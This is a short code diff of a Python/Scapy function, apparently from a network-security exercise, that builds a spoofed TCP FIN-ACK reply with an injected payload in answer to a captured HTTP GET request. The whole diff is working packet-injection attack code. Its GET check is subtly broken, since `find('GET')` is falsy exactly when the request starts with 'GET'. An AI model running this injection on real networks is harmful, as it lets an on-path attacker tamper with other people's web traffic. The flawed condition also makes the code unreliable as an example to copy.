@@ -20,20 +20,17 @@ def get_tcp_injection_packet(packet):
     """
     if q1.packet_filter(packet):
         if packet[S.TCP].load.find('GET'):
-            ip = packet[S.IP]
-            tcp = packet[S.TCP]
+            ip = packet.getlayer(S.IP) #packet[S.IP]
+            tcp = packet.getlayer(S.TCP) #packet[S.TCP]
             # IP layer of the response packet:
-            response = S.IP(dst = ip.src, src = ip.dst)
             # Warpping the IP packet with a TCP layer and setting
             # source port to match the original source port
             # and destination port to be 80 for HTTP.
             # Also sets the TCP flags to Acknowldeged and Finish (FA).
             # Finally we set the sequence number to be the ack number of the packet
             # and the ack number to be the seq number of the packet + the length of the tcp layer.
-            response = response / S.TCP(dport = ip.sport, sport = ip.dport, flags = 'FA', seq = tcp.ack, ack = tcp.seq + len(tcp.payload))
             # Appending the load to the packet
-            response = response / S.Raw(load = RESPONSE)
-            return response 
+            return S.IP(dst = ip.src, src = ip.dst) / S.TCP(dport = ip.sport, sport = ip.dport, flags = 'FA', seq = tcp.ack, ack = tcp.seq + len(tcp.payload)) / S.Raw(load = RESPONSE)
     return None
 
 
